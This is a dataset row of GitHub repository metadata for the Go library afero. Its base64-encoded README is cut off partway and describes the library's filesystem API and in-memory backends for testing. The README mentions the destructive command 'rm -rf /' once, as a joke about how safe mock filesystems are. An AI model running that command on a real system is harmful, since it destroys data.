name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
b'afero',25872841,b'A FileSystem Abstraction System for Go',b'Go',83,2400,,2400,False,b'https://api.github.com/repos/spf13/afero/forks',"IVthZmVybyBsb2dvLXNtXShodHRwczovL2Nsb3VkLmdpdGh1YnVzZXJjb250
ZW50LmNvbS9hc3NldHMvMTczNDEyLzExNDkwMzM4L2Q1MGUxNmRjLTk3YTUt
MTFlNS04YjEyLTAxOWEzMDBkMGZjYi5wbmcpCgpBIEZpbGVTeXN0ZW0gQWJz
dHJhY3Rpb24gU3lzdGVtIGZvciBHbwoKWyFbQnVpbGQgU3RhdHVzXShodHRw
czovL3RyYXZpcy1jaS5vcmcvc3BmMTMvYWZlcm8uc3ZnKV0oaHR0cHM6Ly90
cmF2aXMtY2kub3JnL3NwZjEzL2FmZXJvKSBbIVtCdWlsZCBzdGF0dXNdKGh0
dHBzOi8vY2kuYXBwdmV5b3IuY29tL2FwaS9wcm9qZWN0cy9zdGF0dXMvZ2l0
aHViL3NwZjEzL2FmZXJvP2JyYW5jaD1tYXN0ZXImc3ZnPXRydWUpXShodHRw
czovL2NpLmFwcHZleW9yLmNvbS9wcm9qZWN0L3NwZjEzL2FmZXJvKSBbIVtH
b0RvY10oaHR0cHM6Ly9nb2RvYy5vcmcvZ2l0aHViLmNvbS9zcGYxMy9hZmVy
bz9zdGF0dXMuc3ZnKV0oaHR0cHM6Ly9nb2RvYy5vcmcvZ2l0aHViLmNvbS9z
cGYxMy9hZmVybykgWyFbSm9pbiB0aGUgY2hhdCBhdCBodHRwczovL2dpdHRl
ci5pbS9zcGYxMy9hZmVyb10oaHR0cHM6Ly9iYWRnZXMuZ2l0dGVyLmltL0Rl
diUyMENoYXQuc3ZnKV0oaHR0cHM6Ly9naXR0ZXIuaW0vc3BmMTMvYWZlcm8/
dXRtX3NvdXJjZT1iYWRnZSZ1dG1fbWVkaXVtPWJhZGdlJnV0bV9jYW1wYWln
bj1wci1iYWRnZSZ1dG1fY29udGVudD1iYWRnZSkKCiMgT3ZlcnZpZXcKCkFm
ZXJvIGlzIGFuIGZpbGVzeXN0ZW0gZnJhbWV3b3JrIHByb3ZpZGluZyBhIHNp
bXBsZSwgdW5pZm9ybSBhbmQgdW5pdmVyc2FsIEFQSQppbnRlcmFjdGluZyB3
aXRoIGFueSBmaWxlc3lzdGVtLCBhcyBhbiBhYnN0cmFjdGlvbiBsYXllciBw
cm92aWRpbmcgaW50ZXJmYWNlcywKdHlwZXMgYW5kIG1ldGhvZHMuIEFmZXJv
IGhhcyBhbiBleGNlcHRpb25hbGx5IGNsZWFuIGludGVyZmFjZSBhbmQgc2lt
cGxlIGRlc2lnbgp3aXRob3V0IG5lZWRsZXNzIGNvbnN0cnVjdG9ycyBvciBp
bml0aWFsaXphdGlvbiBtZXRob2RzLgoKQWZlcm8gaXMgYWxzbyBhIGxpYnJh
cnkgcHJvdmlkaW5nIGEgYmFzZSBzZXQgb2YgaW50ZXJvcGVyYWJsZSBiYWNr
ZW5kCmZpbGVzeXN0ZW1zIHRoYXQgbWFrZSBpdCBlYXN5IHRvIHdvcmsgd2l0
aCBhZmVybyB3aGlsZSByZXRhaW5pbmcgYWxsIHRoZSBwb3dlcgphbmQgYmVu
ZWZpdCBvZiB0aGUgb3MgYW5kIGlvdXRpbCBwYWNrYWdlcy4KCkFmZXJvIHBy
b3ZpZGVzIHNpZ25pZmljYW50IGltcHJvdmVtZW50cyBvdmVyIHVzaW5nIHRo
ZSBvcyBwYWNrYWdlIGFsb25lLCBtb3N0Cm5vdGFibHkgdGhlIGFiaWxpdHkg
dG8gY3JlYXRlIG1vY2sgYW5kIHRlc3RpbmcgZmlsZXN5c3RlbXMgd2l0aG91
dCByZWx5aW5nIG9uIHRoZSBkaXNrLgoKSXQgaXMgc3VpdGFibGUgZm9yIHVz
ZSBpbiBhIGFueSBzaXR1YXRpb24gd2hlcmUgeW91IHdvdWxkIGNvbnNpZGVy
IHVzaW5nIHRoZSBPUwpwYWNrYWdlIGFzIGl0IHByb3ZpZGVzIGFuIGFkZGl0
aW9uYWwgYWJzdHJhY3Rpb24gdGhhdCBtYWtlcyBpdCBlYXN5IHRvIHVzZSBh
Cm1lbW9yeSBiYWNrZWQgZmlsZSBzeXN0ZW0gZHVyaW5nIHRlc3RpbmcuIEl0
IGFsc28gYWRkcyBzdXBwb3J0IGZvciB0aGUgaHR0cApmaWxlc3lzdGVtIGZv
ciBmdWxsIGludGVyb3BlcmFiaWxpdHkuCgoKIyMgQWZlcm8gRmVhdHVyZXMK
CiogQSBzaW5nbGUgY29uc2lzdGVudCBBUEkgZm9yIGFjY2Vzc2luZyBhIHZh
cmlldHkgb2YgZmlsZXN5c3RlbXMKKiBJbnRlcm9wZXJhdGlvbiBiZXR3ZWVu
IGEgdmFyaWV0eSBvZiBmaWxlIHN5c3RlbSB0eXBlcwoqIEEgc2V0IG9mIGlu
dGVyZmFjZXMgdG8gZW5jb3VyYWdlIGFuZCBlbmZvcmNlIGludGVyb3BlcmFi
aWxpdHkgYmV0d2VlbiBiYWNrZW5kcwoqIEFuIGF0b21pYyBjcm9zcyBwbGF0
Zm9ybSBtZW1vcnkgYmFja2VkIGZpbGUgc3lzdGVtCiogU3VwcG9ydCBmb3Ig
Y29tcG9zaXRpb25hbCAodW5pb24pIGZpbGUgc3lzdGVtcyBieSBjb21iaW5p
bmcgbXVsdGlwbGUgZmlsZSBzeXN0ZW1zIGFjdGluZyBhcyBvbmUKKiBTcGVj
aWFsaXplZCBiYWNrZW5kcyB3aGljaCBtb2RpZnkgZXhpc3RpbmcgZmlsZXN5
c3RlbXMgKFJlYWQgT25seSwgUmVnZXhwIGZpbHRlcmVkKQoqIEEgc2V0IG9m
IHV0aWxpdHkgZnVuY3Rpb25zIHBvcnRlZCBmcm9tIGlvLCBpb3V0aWwgJiBo
dWdvIHRvIGJlIGFmZXJvIGF3YXJlCgoKIyBVc2luZyBBZmVybwoKQWZlcm8g
aXMgZWFzeSB0byB1c2UgYW5kIGVhc2llciB0byBhZG9wdC4KCkEgZmV3IGRp
ZmZlcmVudCB3YXlzIHlvdSBjb3VsZCB1c2UgQWZlcm86CgoqIFVzZSB0aGUg
aW50ZXJmYWNlcyBhbG9uZSB0byBkZWZpbmUgeW91IG93biBmaWxlIHN5c3Rl
bS4KKiBXcmFwIGZvciB0aGUgT1MgcGFja2FnZXMuCiogRGVmaW5lIGRpZmZl
cmVudCBmaWxlc3lzdGVtcyBmb3IgZGlmZmVyZW50IHBhcnRzIG9mIHlvdXIg
YXBwbGljYXRpb24uCiogVXNlIEFmZXJvIGZvciBtb2NrIGZpbGVzeXN0ZW1z
IHdoaWxlIHRlc3RpbmcKCiMjIFN0ZXAgMTogSW5zdGFsbCBBZmVybwoKRmly
c3QgdXNlIGdvIGdldCB0byBpbnN0YWxsIHRoZSBsYXRlc3QgdmVyc2lvbiBv
ZiB0aGUgbGlicmFyeS4KCiAgICAkIGdvIGdldCBnaXRodWIuY29tL3NwZjEz
L2FmZXJvCgpOZXh0IGluY2x1ZGUgQWZlcm8gaW4geW91ciBhcHBsaWNhdGlv
bi4KYGBgZ28KaW1wb3J0ICJnaXRodWIuY29tL3NwZjEzL2FmZXJvIgpgYGAK
CiMjIFN0ZXAgMjogRGVjbGFyZSBhIGJhY2tlbmQKCkZpcnN0IGRlZmluZSBh
IHBhY2thZ2UgdmFyaWFibGUgYW5kIHNldCBpdCB0byBhIHBvaW50ZXIgdG8g
YSBmaWxlc3lzdGVtLgpgYGBnbwp2YXIgQXBwRnMgPSBhZmVyby5OZXdNZW1N
YXBGcygpCgpvcgoKdmFyIEFwcEZzID0gYWZlcm8uTmV3T3NGcygpCmBgYApJ
dCBpcyBpbXBvcnRhbnQgdG8gbm90ZSB0aGF0IGlmIHlvdSByZXBlYXQgdGhl
IGNvbXBvc2l0ZSBsaXRlcmFsIHlvdQp3aWxsIGJlIHVzaW5nIGEgY29tcGxl
dGVseSBuZXcgYW5kIGlzb2xhdGVkIGZpbGVzeXN0ZW0uIEluIHRoZSBjYXNl
IG9mCk9zRnMgaXQgd2lsbCBzdGlsbCB1c2UgdGhlIHNhbWUgdW5kZXJseWlu
ZyBmaWxlc3lzdGVtIGJ1dCB3aWxsIHJlZHVjZQp0aGUgYWJpbGl0eSB0byBk
cm9wIGluIG90aGVyIGZpbGVzeXN0ZW1zIGFzIGRlc2lyZWQuCgojIyBTdGVw
IDM6IFVzZSBpdCBsaWtlIHlvdSB3b3VsZCB0aGUgT1MgcGFja2FnZQoKVGhy
b3VnaG91dCB5b3VyIGFwcGxpY2F0aW9uIHVzZSBhbnkgZnVuY3Rpb24gYW5k
IG1ldGhvZCBsaWtlIHlvdSBub3JtYWxseQp3b3VsZC4KClNvIGlmIG15IGFw
cGxpY2F0aW9uIGJlZm9yZSBoYWQ6CmBgYGdvCm9zLk9wZW4oJy90bXAvZm9v
JykKYGBgCldlIHdvdWxkIHJlcGxhY2UgaXQgd2l0aDoKYGBgZ28KQXBwRnMu
T3BlbignL3RtcC9mb28nKQpgYGAKCmBBcHBGc2AgYmVpbmcgdGhlIHZhcmlh
YmxlIHdlIGRlZmluZWQgYWJvdmUuCgoKIyMgTGlzdCBvZiBhbGwgYXZhaWxh
YmxlIGZ1bmN0aW9ucwoKRmlsZSBTeXN0ZW0gTWV0aG9kcyBBdmFpbGFibGU6
CmBgYGdvCkNobW9kKG5hbWUgc3RyaW5nLCBtb2RlIG9zLkZpbGVNb2RlKSA6
IGVycm9yCkNodGltZXMobmFtZSBzdHJpbmcsIGF0aW1lIHRpbWUuVGltZSwg
bXRpbWUgdGltZS5UaW1lKSA6IGVycm9yCkNyZWF0ZShuYW1lIHN0cmluZykg
OiBGaWxlLCBlcnJvcgpNa2RpcihuYW1lIHN0cmluZywgcGVybSBvcy5GaWxl
TW9kZSkgOiBlcnJvcgpNa2RpckFsbChwYXRoIHN0cmluZywgcGVybSBvcy5G
aWxlTW9kZSkgOiBlcnJvcgpOYW1lKCkgOiBzdHJpbmcKT3BlbihuYW1lIHN0
cmluZykgOiBGaWxlLCBlcnJvcgpPcGVuRmlsZShuYW1lIHN0cmluZywgZmxh
ZyBpbnQsIHBlcm0gb3MuRmlsZU1vZGUpIDogRmlsZSwgZXJyb3IKUmVtb3Zl
KG5hbWUgc3RyaW5nKSA6IGVycm9yClJlbW92ZUFsbChwYXRoIHN0cmluZykg
OiBlcnJvcgpSZW5hbWUob2xkbmFtZSwgbmV3bmFtZSBzdHJpbmcpIDogZXJy
b3IKU3RhdChuYW1lIHN0cmluZykgOiBvcy5GaWxlSW5mbywgZXJyb3IKYGBg
CkZpbGUgSW50ZXJmYWNlcyBhbmQgTWV0aG9kcyBBdmFpbGFibGU6CmBgYGdv
CmlvLkNsb3Nlcgppby5SZWFkZXIKaW8uUmVhZGVyQXQKaW8uU2Vla2VyCmlv
LldyaXRlcgppby5Xcml0ZXJBdAoKTmFtZSgpIDogc3RyaW5nClJlYWRkaXIo
Y291bnQgaW50KSA6IFtdb3MuRmlsZUluZm8sIGVycm9yClJlYWRkaXJuYW1l
cyhuIGludCkgOiBbXXN0cmluZywgZXJyb3IKU3RhdCgpIDogb3MuRmlsZUlu
Zm8sIGVycm9yClN5bmMoKSA6IGVycm9yClRydW5jYXRlKHNpemUgaW50NjQp
IDogZXJyb3IKV3JpdGVTdHJpbmcocyBzdHJpbmcpIDogcmV0IGludCwgZXJy
IGVycm9yCmBgYApJbiBzb21lIGFwcGxpY2F0aW9ucyBpdCBtYXkgbWFrZSBz
ZW5zZSB0byBkZWZpbmUgYSBuZXcgcGFja2FnZSB0aGF0CnNpbXBseSBleHBv
cnRzIHRoZSBmaWxlIHN5c3RlbSB2YXJpYWJsZSBmb3IgZWFzeSBhY2Nlc3Mg
ZnJvbSBhbnl3aGVyZS4KCiMjIFVzaW5nIEFmZXJvJ3MgdXRpbGl0eSBmdW5j
dGlvbnMKCkFmZXJvIHByb3ZpZGVzIGEgc2V0IG9mIGZ1bmN0aW9ucyB0byBt
YWtlIGl0IGVhc2llciB0byB1c2UgdGhlIHVuZGVybHlpbmcgZmlsZSBzeXN0
ZW1zLgpUaGVzZSBmdW5jdGlvbnMgaGF2ZSBiZWVuIHByaW1hcmlseSBwb3J0
ZWQgZnJvbSBpbyAmIGlvdXRpbCB3aXRoIHNvbWUgZGV2ZWxvcGVkIGZvciBI
dWdvLgoKVGhlIGFmZXJvIHV0aWxpdGllcyBzdXBwb3J0IGFsbCBhZmVybyBj
b21wYXRpYmxlIGJhY2tlbmRzLgoKVGhlIGxpc3Qgb2YgdXRpbGl0aWVzIGlu
Y2x1ZGVzOgoKYGBgZ28KRGlyRXhpc3RzKHBhdGggc3RyaW5nKSAoYm9vbCwg
ZXJyb3IpCkV4aXN0cyhwYXRoIHN0cmluZykgKGJvb2wsIGVycm9yKQpGaWxl
Q29udGFpbnNCeXRlcyhmaWxlbmFtZSBzdHJpbmcsIHN1YnNsaWNlIFtdYnl0
ZSkgKGJvb2wsIGVycm9yKQpHZXRUZW1wRGlyKHN1YlBhdGggc3RyaW5nKSBz
dHJpbmcKSXNEaXIocGF0aCBzdHJpbmcpIChib29sLCBlcnJvcikKSXNFbXB0
eShwYXRoIHN0cmluZykgKGJvb2wsIGVycm9yKQpSZWFkRGlyKGRpcm5hbWUg
c3RyaW5nKSAoW11vcy5GaWxlSW5mbywgZXJyb3IpClJlYWRGaWxlKGZpbGVu
YW1lIHN0cmluZykgKFtdYnl0ZSwgZXJyb3IpClNhZmVXcml0ZVJlYWRlcihw
YXRoIHN0cmluZywgciBpby5SZWFkZXIpIChlcnIgZXJyb3IpClRlbXBEaXIo
ZGlyLCBwcmVmaXggc3RyaW5nKSAobmFtZSBzdHJpbmcsIGVyciBlcnJvcikK
VGVtcEZpbGUoZGlyLCBwcmVmaXggc3RyaW5nKSAoZiBGaWxlLCBlcnIgZXJy
b3IpCldhbGsocm9vdCBzdHJpbmcsIHdhbGtGbiBmaWxlcGF0aC5XYWxrRnVu
YykgZXJyb3IKV3JpdGVGaWxlKGZpbGVuYW1lIHN0cmluZywgZGF0YSBbXWJ5
dGUsIHBlcm0gb3MuRmlsZU1vZGUpIGVycm9yCldyaXRlUmVhZGVyKHBhdGgg
c3RyaW5nLCByIGlvLlJlYWRlcikgKGVyciBlcnJvcikKYGBgCkZvciBhIGNv
bXBsZXRlIGxpc3Qgc2VlIFtBZmVybydzIEdvRG9jXShodHRwczovL2dvZG9j
Lm9yZy9naXRodWIuY29tL3NwZjEzL2FmZXJvKQoKVGhleSBhcmUgYXZhaWxh
YmxlIHVuZGVyIHR3byBkaWZmZXJlbnQgYXBwcm9hY2hlcyB0byB1c2UuIFlv
dSBjYW4gZWl0aGVyIGNhbGwKdGhlbSBkaXJlY3RseSB3aGVyZSB0aGUgZmly
c3QgcGFyYW1ldGVyIG9mIGVhY2ggZnVuY3Rpb24gd2lsbCBiZSB0aGUgZmls
ZQpzeXN0ZW0sIG9yIHlvdSBjYW4gZGVjbGFyZSBhIG5ldyBgQWZlcm9gLCBh
IGN1c3RvbSB0eXBlIHVzZWQgdG8gYmluZCB0aGVzZQpmdW5jdGlvbnMgYXMg
bWV0aG9kcyB0byBhIGdpdmVuIGZpbGVzeXN0ZW0uCgojIyMgQ2FsbGluZyB1
dGlsaXRpZXMgZGlyZWN0bHkKCmBgYGdvCmZzIDo9IG5ldyhhZmVyby5NZW1N
YXBGcykKZiwgZXJyIDo9IGFmZXJvLlRlbXBGaWxlKGZzLCIiLCAiaW91dGls
LXRlc3QiKQoKYGBgCgojIyMgQ2FsbGluZyB2aWEgQWZlcm8KCmBgYGdvCmZz
IDo9IGFmZXJvLk5ld01lbU1hcEZzKCkKYWZzIDo9ICZhZmVyby5BZmVyb3tG
czogZnN9CmYsIGVyciA6PSBhZnMuVGVtcEZpbGUoIiIsICJpb3V0aWwtdGVz
dCIpCmBgYAoKIyMgVXNpbmcgQWZlcm8gZm9yIFRlc3RpbmcKClRoZXJlIGlz
IGEgbGFyZ2UgYmVuZWZpdCB0byB1c2luZyBhIG1vY2sgZmlsZXN5c3RlbSBm
b3IgdGVzdGluZy4gSXQgaGFzIGEKY29tcGxldGVseSBibGFuayBzdGF0ZSBl
dmVyeSB0aW1lIGl0IGlzIGluaXRpYWxpemVkIGFuZCBjYW4gYmUgZWFzaWx5
CnJlcHJvZHVjaWJsZSByZWdhcmRsZXNzIG9mIE9TLiBZb3UgY291bGQgY3Jl
YXRlIGZpbGVzIHRvIHlvdXIgaGVhcnTigJlzIGNvbnRlbnQKYW5kIHRoZSBm
aWxlIGFjY2VzcyB3b3VsZCBiZSBmYXN0IHdoaWxlIGFsc28gc2F2aW5nIHlv
dSBmcm9tIGFsbCB0aGUgYW5ub3lpbmcKaXNzdWVzIHdpdGggZGVsZXRpbmcg
dGVtcG9yYXJ5IGZpbGVzLCBXaW5kb3dzIGZpbGUgbG9ja2luZywgZXRjLiBU
aGUgTWVtTWFwRnMKYmFja2VuZCBpcyBwZXJmZWN0IGZvciB0ZXN0aW5nLgoK
KiBNdWNoIGZhc3RlciB0aGFuIHBlcmZvcm1pbmcgSS9PIG9wZXJhdGlvbnMg
b24gZGlzawoqIEF2b2lkIHNlY3VyaXR5IGlzc3VlcyBhbmQgcGVybWlzc2lv
bnMKKiBGYXIgbW9yZSBjb250cm9sLiAncm0gLXJmIC8nIHdpdGggY29uZmlk
ZW5jZQoqIFRlc3Qgc2V0dXAgaXMgZmFyIG1vcmUgZWFzaWVyIHRvIGRvCiog
Tm8gdGVzdCBjbGVhbnVwIG5lZWRlZAoKT25lIHdheSB0byBhY2NvbXBsaXNo
IHRoaXMgaXMgdG8gZGVmaW5lIGEgdmFyaWFibGUgYXMgbWVudGlvbmVkIGFi
b3ZlLgpJbiB5b3VyIGFwcGxpY2F0aW9uIHRoaXMgd2lsbCBiZSBzZXQgdG8g
YWZlcm8uTmV3T3NGcygpIGR1cmluZyB0ZXN0aW5nIHlvdQpjYW4gc2V0IGl0
IHRvIGFmZXJvLk5ld01lbU1hcEZzKCkuCgpJdCB3b3VsZG4ndCBiZSB1bmNv
bW1vbiB0byBoYXZlIGVhY2ggdGVzdCBpbml0aWFsaXplIGEgYmxhbmsgc2xh
dGUgbWVtb3J5CmJhY2tlbmQuIFRvIGRvIHRoaXMgSSB3b3VsZCBkZWZpbmUg
bXkgYGFwcEZTID0gYWZlcm8uTmV3T3NGcygpYCBzb21ld2hlcmUKYXBwcm9w
cmlhdGUgaW4gbXkgYXBwbGljYXRpb24gY29kZS4gVGhpcyBhcHByb2FjaCBl
bnN1cmVzIHRoYXQgVGVzdHMgYXJlIG9yZGVyCmluZGVwZW5kZW50LCB3aXRo
IG5vIHRlc3QgcmVseWluZyBvbiB0aGUgc3RhdGUgbGVmdCBieSBhbiBlYXJs
aWVyIHRlc3QuCgpUaGVuIGluIG15IHRlc3RzIEkgd291bGQgaW5pdGlhbGl6
ZSBhIG5ldyBNZW1NYXBGcyBmb3IgZWFjaCB0ZXN0OgpgYGBnbwpmdW5jIFRl
c3RFeGlzdCh0ICp0ZXN0aW5nLlQpIHsKCWFwcEZTIDo9IGFmZXJvLk5ld01l
bU1hcEZzKCkKCS8vIGNyZWF0ZSB0ZXN0IGZpbGVzIGFuZCBkaXJlY3Rvcmll
cwoJYXBwRlMuTWtkaXJBbGwoInNyYy9hIiwgMDc1NSkKCWFmZXJvLldyaXRl
RmlsZShhcHBGUywgInNyYy9hL2IiLCBbXWJ5dGUoImZpbGUgYiIpLCAwNjQ0
KQoJYWZlcm8uV3JpdGVGaWxlKGFwcEZTLCAic3JjL2MiLCBbXWJ5dGUoImZp
bGUgYyIpLCAwNjQ0KQoJbmFtZSA6PSAic3JjL2MiCglfLCBlcnIgOj0gYXBw
RlMuU3RhdChuYW1lKQoJaWYgb3MuSXNOb3RFeGlzdChlcnIpIHsKCQl0LkVy
cm9yZigiZmlsZSBcIiVzXCIgZG9lcyBub3QgZXhpc3QuXG4iLCBuYW1lKQoJ
fQp9CmBgYAoKIyBBdmFpbGFibGUgQmFja2VuZHMKCiMjIE9wZXJhdGluZyBT
eXN0ZW0gTmF0aXZlCgojIyMgT3NGcwoKVGhlIGZpcnN0IGlzIHNpbXBseSBh
IHdyYXBwZXIgYXJvdW5kIHRoZSBuYXRpdmUgT1MgY2FsbHMuIFRoaXMgbWFr
ZXMgaXQKdmVyeSBlYXN5IHRvIHVzZSBhcyBhbGwgb2YgdGhlIGNhbGxzIGFy
ZSB0aGUgc2FtZSBhcyB0aGUgZXhpc3RpbmcgT1MKY2FsbHMuIEl0IGFsc28g
bWFrZXMgaXQgdHJpdmlhbCB0byBoYXZlIHlvdXIgY29kZSB1c2UgdGhlIE9T
IGR1cmluZwpvcGVyYXRpb24gYW5kIGEgbW9jayBmaWxlc3lzdGVtIGR1cmlu
ZyB0ZXN0aW5nIG9yIGFzIG5lZWRlZC4KCmBgYGdvCmFwcGZzIDo9IGFmZXJv
Lk5ld09zRnMoKQphcHBmcy5Na2RpckFsbCgic3JjL2EiLCAwNzU1KSkKYGBg
CgojIyBNZW1vcnkgQmFja2VkIFN0b3JhZ2UKCiMjIyBNZW1NYXBGcwoKQWZl
cm8gYWxzbyBwcm92aWRlcyBhIGZ1bGx5IGF0b21pYyBtZW1vcnkgYmFja2Vk
IGZpbGVzeXN0ZW0gcGVyZmVjdCBmb3IgdXNlIGluCm1vY2tpbmcgYW5kIHRv
IHNwZWVkIHVwIHVubmVjZXNzYXJ5IGRpc2sgaW8gd2hlbiBwZXJzaXN0ZW5j
ZSBpc27igJl0Cm5lY2Vzc2FyeS4gSXQgaXMgZnVsbHkgY29uY3VycmVudCBh
bmQgd2lsbCB3b3JrIHdpdGhpbiBnbyByb3V0aW5lcwpzYWZlbHkuCgpgYGBn
bwptbSA6PSBhZmVyby5OZXdNZW1NYXBGcygpCm1tLk1rZGlyQWxsKCJzcmMv
YSIsIDA3NTUpKQpgYGAKCiMjIyMgSW5NZW1vcnlGaWxlCgpBcyBwYXJ0IG9m
IE1lbU1hcEZzLCBBZmVybyBhbHNvIHByb3ZpZGVzIGFuIGF0b21pYywgZnVs
bHkgY29uY3VycmVudCBtZW1vcnkKYmFja2VkIGZpbGUgaW1wbGVtZW50YXRp
b24uIFRoaXMgY2FuIGJlIHVzZWQgaW4gb3RoZXIgbWVtb3J5IGJhY2tlZCBm
aWxlCnN5c3RlbXMgd2l0aCBlYXNlLiBQbGFucyBhcmUgdG8gYWRkIGEgcmFk
